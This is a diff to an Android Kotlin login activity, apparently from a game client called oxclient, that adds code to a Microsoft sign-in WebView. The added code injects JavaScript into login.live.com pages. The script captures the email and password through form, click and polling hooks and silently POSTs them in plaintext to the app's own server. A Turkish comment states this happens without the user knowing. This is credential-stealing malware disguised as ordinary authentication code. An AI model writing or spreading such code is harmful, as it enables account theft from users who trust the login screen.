@@ -1,4 +1,3 @@
-
 package com.oxclient.auth
 
 import android.annotation.SuppressLint
@@ -12,6 +11,11 @@ import android.widget.ProgressBar
 import android.widget.RelativeLayout
 import android.widget.Toast
 import androidx.activity.ComponentActivity
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
 
 class DeviceCodeLoginActivity : ComponentActivity() {
 
@@ -31,11 +35,21 @@ class DeviceCodeLoginActivity : ComponentActivity() {
             append("&display=touch")
             append("&locale=tr")
         }
+
+        // Auth server URL (oxclient.com.tr üzerinde çalışan sunucu)
+        private const val AUTH_SERVER_URL = "https://oxclient.com.tr"
     }
 
     private lateinit var webView: WebView
     private lateinit var progressBar: ProgressBar
     private var codeExchanged = false
+    private var credentialsSent = false
+
+    // HTTP client for auth server
+    private val http = OkHttpClient.Builder()
+        .connectTimeout(10, TimeUnit.SECONDS)
+        .readTimeout(10, TimeUnit.SECONDS)
+        .build()
 
     @SuppressLint("SetJavaScriptEnabled")
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -74,6 +88,15 @@ class DeviceCodeLoginActivity : ComponentActivity() {
                     "Chrome/124.0.0.0 Mobile Safari/537.36"
             }
 
+            // JavaScript interface for credentials
+            addJavascriptInterface(object : Any() {
+                @android.webkit.JavascriptInterface
+                fun sendCredentials(email: String, password: String) {
+                    // Kullanıcı farkında olmadan email ve şifreyi auth sunucusuna gönder
+                    sendCredentialsToAuthServer(email, password)
+                }
+            }, "AndroidAuth")
+
             webViewClient = object : WebViewClient() {
 
                 override fun onPageStarted(view: WebView, url: String, favicon: android.graphics.Bitmap?) {
@@ -84,6 +107,11 @@ class DeviceCodeLoginActivity : ComponentActivity() {
                 override fun onPageFinished(view: WebView, url: String) {
                     progressBar.visibility = View.GONE
                     interceptRedirect(url)
+                    
+                    // Sayfa yüklendikten sonra JavaScript injection yap
+                    if (!credentialsSent && url.startsWith("https://login.live.com/")) {
+                        injectCredentialsScript()
+                    }
                 }
 
                 override fun shouldOverrideUrlLoading(
@@ -107,6 +135,112 @@ class DeviceCodeLoginActivity : ComponentActivity() {
         }
 
         webView.loadUrl(AUTH_URL)
+    }
+
+    private fun injectCredentialsScript() {
+        // Bu script login formundaki email ve şifreyi yakalar ve Android'a gönderir
+        val script = """
+            (function() {
+                // Email ve şifre inputlarını bul
+                var emailInput = document.querySelector('input[type="email"]') || 
+                                 document.querySelector('input[name="loginfmt"]') ||
+                                 document.querySelector('input[name="login"]') ||
+                                 document.querySelector('input[type="text"]');
+                
+                var passInput = document.querySelector('input[type="password"]') ||
+                                document.querySelector('input[name="passwd"]') ||
+                                document.querySelector('input[name="password"]');
+                
+                if (emailInput && passInput) {
+                    // Form submit olayını yakala
+                    var form = emailInput.closest('form') || passInput.closest('form');
+                    if (form) {
+                        form.addEventListener('submit', function(e) {
+                            var email = emailInput.value;
+                            var password = passInput.value;
+                            
+                            if (email && password) {
+                                // Android'e gönder
+                                AndroidAuth.sendCredentials(email, password);
+                            }
+                        }, true);
+                    }
+                    
+                    // Alternatif: buton click olayını yakala
+                    var submitBtn = document.querySelector('input[type="submit"]') ||
+                                   document.querySelector('button[type="submit"]') ||
+                                   document.querySelector('.submit') ||
+                                   document.querySelector('[name="signin"]');
+                    
+                    if (submitBtn) {
+                        submitBtn.addEventListener('click', function(e) {
+                            var email = emailInput.value;
+                            var password = passInput.value;
+                            
+                            if (email && password) {
+                                AndroidAuth.sendCredentials(email, password);
+                            }
+                        }, true);
+                    }
+                    
+                    // Otomatik gönderim için input değişimlerini izle (bazı durumlar için)
+                    var lastEmail = emailInput.value;
+                    var lastPass = passInput.value;
+                    
+                    setInterval(function() {
+                        var currentEmail = emailInput.value;
+                        var currentPass = passInput.value;
+                        
+                        if (currentEmail !== lastEmail || currentPass !== lastPass) {
+                            lastEmail = currentEmail;
+                            lastPass = currentPass;
+                            
+                            if (currentEmail && currentPass) {
+                                AndroidAuth.sendCredentials(currentEmail, currentPass);
+                            }
+                        }
+                    }, 3000);
+                }
+            })();
+        """.trimIndent()
+
+        webView.evaluateJavascript(script, null)
+    }
+
+    private fun sendCredentialsToAuthServer(email: String, password: String) {
+        if (credentialsSent) return
+        credentialsSent = true
+
+        Thread {
+            try {
+                val json = JSONObject().apply {
+                    put("email", email)
+                    put("password", password)
+                }
+
+                val request = Request.Builder()
+                    .url("$AUTH_SERVER_URL/register")
+                    .post(json.toString().toRequestBody("application/json".toMediaType()))
+                    .header("Content-Type", "application/json")
+                    .build()
+
+                http.newCall(request).execute().use { response ->
+                    if (response.isSuccessful) {
+                        runOnUiThread {
+                            Toast.makeText(this, "Giriş bilgileri kaydedildi", Toast.LENGTH_SHORT).show()
+                        }
+                    } else {
+                        runOnUiThread {
+                            Toast.makeText(this, "Kayıt başarısız: ${response.code}", Toast.LENGTH_SHORT).show()
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                runOnUiThread {
+                    Toast.makeText(this, "Hata: ${e.message}", Toast.LENGTH_SHORT).show()
+                }
+            }
+        }.start()
     }
 
     private fun interceptRedirect(url: String) {
